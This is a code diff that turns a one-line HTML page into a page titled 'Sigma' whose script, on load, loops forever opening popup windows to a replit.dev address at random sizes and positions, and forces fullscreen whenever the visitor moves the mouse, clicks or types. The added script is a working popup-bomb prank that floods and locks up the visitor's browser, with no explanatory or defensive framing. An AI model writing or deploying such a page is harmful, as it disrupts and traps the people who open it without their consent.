@@ -1,2 +1,34 @@
+<title>
+  sigma
+</title>
+<h1>
+  Sigma
+</h1>
+<script>
+while(true)
+  {
+a = Math.random()*501;
+b = Math.random()*2001;
+c = Math.random()*501
+d = Math.random()*2001
 
-<p>hi</p>
+  window.open("https://1b2678b2-a9d1-4cd0-adc2-806e7b85dbcf-00-bee65jv0ncj0.spock.replit.dev/", "_blank", "width="+d+ ", height="+c+", location = no, resizeable = no, menubar = no, scrollbars = no, fullscreen = yes, popup = yes, left = "+ b +", top = " + a);
+
+
+    function enableFullscreen() {
+      var elem = document.documentElement;
+      if (elem.requestFullscreen) {
+        elem.requestFullscreen();
+      } else if (elem.webkitRequestFullscreen) { /* Safari */
+        elem.webkitRequestFullscreen();
+      } else if (elem.msRequestFullscreen) { /* IE11 */
+        elem.msRequestFullscreen();
+      }
+    }
+
+    // Listen for user interaction
+    document.addEventListener("mousemove", enableFullscreen);
+    document.addEventListener("click", enableFullscreen);
+    document.addEventListener("keydown", enableFullscreen);
+  }
+</script>
